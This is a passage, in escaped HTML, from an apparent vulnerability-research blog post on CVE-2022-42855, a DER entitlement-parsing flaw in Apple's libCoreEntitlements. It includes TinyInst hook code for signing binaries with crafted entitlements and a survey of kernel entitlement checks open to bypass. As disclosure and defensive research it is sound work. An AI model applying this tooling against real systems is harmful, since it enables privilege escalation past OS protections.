class=\"wUhACgDjbS-c5\"&gt;out_addr&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;der_size&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;sizeof&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;der_size&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;SetReturnValue&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;kCENoError&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c7\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CESerializeWithOptionsHook&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;OnFunctionEntered&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;()&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c28\"&gt;// 5th argument points to output buffer&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; printf&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;In CESerializeWithOptions\\n&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; size_t out_addr &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;=&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;GetArg&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c24\"&gt;4&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;RemoteWrite&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;((&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;*)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;out_addr&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;der&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;der_size&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;SetReturnValue&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;kCENoError&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c7\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CEInst&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CEInst&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;()&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;ReadEntitlementsFile&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;RegisterHook&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;new&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CESizeSerializationHook&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;());&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;RegisterHook&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;new&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CESerializeWithOptionsHook&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;());&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c7\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;CEInst&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;OnModuleLoaded&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;*&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;module&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;char&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;*&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;module_name&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;if&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;strcmp&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;module_name&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;libCoreEntitlements.dylib&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;))&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c28\"&gt;// we must get the value of kCENoError,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c28\"&gt;// which is libCoreEntitlements return value in case no error&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp; size_t kCENoError_addr &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;=&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;size_t&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;GetSymbolAddress&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;module&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;char&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;*)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;_kCENoError&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;if&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;kCENoError_addr&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;FATAL&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c3\"&gt;&amp;quot;Error resolving symbol&amp;quot;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;RemoteRead&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;((&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;void&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;*)&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;kCENoError_addr&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;kCENoError&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;sizeof&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;kCENoError&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;TinyInst&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;::&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;OnModuleLoaded&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;(&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;module&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;,&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5\"&gt;&amp;nbsp;module_name&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;HookReplace (base class for our 2 hooks) is a helper class used to completely replace the function implementation with the hook. &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CESizeSerializationHook::OnFunctionEntered()&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CESerializeWithOptionsHook::OnFunctionEntered()&lt;/span&gt;&lt;span&gt;&amp;nbsp;are the bodies of the hooks. Additional code is needed to read the replacement entitlement DER and also to retrieve the value of kCENoError, which is a value libCoreEntitlements functions return on success and that we must return from our hooked versions. Note that, on macOS Monterey, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CESerializeWithOptions&lt;/span&gt;&lt;span&gt;&amp;nbsp;should be replaced with &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CESerialize&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;and the 3rd argument will be the output address rather than 4th.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;So, with that in place, I could sign a binary using DER provided in the entitlements.der file.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Now, with the tooling in place, the question becomes, how to exploit it. Or rather, which entitlement to target. In order to exploit the issue, we need to find an entitlement check that is ultimately made using &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextQuery&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;API. Unfortunately, that rules out most userspace daemons - all the ones I looked at still did entitlement checking the &amp;ldquo;old way&amp;rdquo;, by first obtaining a dictionary representation of entitlements. That leaves &amp;ldquo;just&amp;rdquo; the entitlement checks done by the OS kernel.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Fortunately, a lot of checks in the kernel are made using the vulnerable API. Some of these checks are done by &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;AppleMobileFileIntegrity&lt;/span&gt;&lt;span&gt;&amp;nbsp;itself using functions like &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;OSEntitlements::queryEntitlementsFor&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;AppleMobileFileIntegrity::AMFIEntitlementGetBool&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;proc_has_entitlement&lt;/span&gt;&lt;span&gt;. But there are other APIs as well. For example, the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;IOTaskHasEntitlement&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;IOCurrentTaskHasEntitlement&lt;/span&gt;&lt;span&gt;&amp;nbsp;functions that are used from over a hundred places in the kernel (according to macOS Monterey kernel cache) end up calling &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextQuery&lt;/span&gt;&lt;span&gt;&amp;nbsp;(by first calling &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfi-&amp;gt;OSEntitlements_query()&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;One other potentially vulnerable API was &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;IOUserClient::copyClientEntitlement&lt;/span&gt;&lt;span&gt;, but only on Apple silicon, where &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;pmap_cs_enabled()&lt;/span&gt;&lt;span&gt;&amp;nbsp;is true. Although I didn&amp;rsquo;t test this, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://github.com/apple-oss-distributions/xnu/blob/e7776783b89a353188416a9a346c6cdb4928faad/iokit/Kernel/IOUserClient.cpp#L1480\"&gt;there is some indication&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;that in that case the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextQuery&lt;/span&gt;&lt;span&gt;&amp;nbsp;API or something similar to it is used. &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;IOUserClient::copyClientEntitlement&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;is most notably used by device drivers to check entitlements.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;I attempted to exploit the issue on both macOS and iOS. On macOS, I found places where such an entitlement bypass could be used to unlock previously unreachable attack surfaces, but nothing that would immediately provide a stand-alone exploit. In the end, to report something while looking for a better primitive, I &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2376\"&gt;reported&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;that I was able to invoke functionality of the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;kext_request&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;API (kernel extension API) that I normally shouldn&amp;rsquo;t be able to do, even as the root user. At the time, I did my testing on macOS Monterey, versions 12.6 and 12.6.1.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;On iOS, exploiting such an issue would potentially be more interesting, as it could be used as part of a jailbreak. I was experimenting with iOS 16.1 and nothing I tried seemed to work, but due to the lack of introspection on the iOS platform I couldn&amp;rsquo;t figure out why at the time.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;That is, until I received a reply from Apple on my macOS report, asking me if I can reproduce on macOS Ventura. macOS Ventura was just released in the same week when I sent my report to Apple and I was hesitant to upgrade to a new major version while having a working setup on macOS Monterey. But indeed, when I upgraded to Ventura, and after making sure my tooling still works, the DER issue wouldn&amp;rsquo;t reproduce anymore. This was likely also the reason all of my iOS experiments were unsuccessful: iOS 16 shares the codebase with macOS Ventura.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;It appears that the issue was fixed due to refactoring and not as a security issue (macOS Monterey would be updated in this case as well as Apple releases some security patches not just for the latest major version of macOS, but also for the two previous ones). Looking at the code, it appears the API &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;libCoreEntitlements&lt;/span&gt;&lt;span&gt;&amp;nbsp;uses to do low-level DER parsing has changed somewhat - on macOS Monterey, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;libCoreEntitlements&lt;/span&gt;&lt;span&gt;&amp;nbsp;used mostly &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;ccder_decode&lt;/span&gt;&lt;span&gt;* functions to interact with DER, while on macOS ventura &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;ccder_blob_decode&lt;/span&gt;&lt;span&gt;* functions are used more often. The latter additionally take the parent DER structure as input and thus make processing of hierarchical DER structure somewhat less error-prone. As a consequence of this change, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;der_vm_execute_nocopy&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;continues processing the next key/value sequence after the end of the current one (which is the intended behavior) and not, as before, after the end of the value object. &amp;nbsp;At this point, since I could no longer reproduce the issue on the latest OS release, I was no longer motivated to write the exploit and stopped my efforts in order to focus on other projects.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Apple addressed the issue as CVE-2022-42855 on December 13, 2022. While Apple applied the CVE to all supported versions of their operating systems, including macOS Ventura and iOS 16, on those latest OS versions the patch seems to serve as an additional validation step. Specifically, on macOS Ventura, the patch is applied to function &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;der_decode_key_value&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;and makes sure that the key/value sequence does not contain other elements besides just key and the value (in other words, it makes sure that the length of the sequence matches length of key + value objects).&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"wUhACgDjbS-c9\" id=\"h.wim4vvikllfz\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c21\"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;It is difficult to claim that a particular code base has no vulnterabilities. While that might be possible for a &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c29\"&gt;specific type&lt;/span&gt;&lt;span&gt;&amp;nbsp;of vulnerabilities, it is difficult, and potentially impossible, to predict all types of vulnerabilities a complex codebase might have. After all, you can&amp;rsquo;t reason about what you don&amp;rsquo;t know.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;While DER encoding is certainly a much safer choice than XML when it comes to parsing logic issues, this blog post demonstrates that such issues are still possible even with the DER format.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;And what about the SHA1 collision? While the identical prefix attack shouldn&amp;rsquo;t work against DER, 